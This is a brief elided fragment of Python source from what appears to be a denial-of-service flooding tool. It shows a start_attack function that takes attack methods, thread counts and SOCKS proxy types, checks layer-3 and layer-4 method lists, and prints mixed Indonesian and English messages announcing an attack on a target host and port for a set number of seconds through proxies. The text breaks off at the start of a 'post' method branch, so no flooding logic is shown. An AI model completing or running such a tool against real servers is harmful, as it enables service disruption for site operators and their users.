...
def start_attack(method, threads, event, socks_type):
    ...
    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        ...
        print("{} Serangan Akan Diluncurkan ke {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
    else:
        print("{} Serangan Akan Diluncurkan ke {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
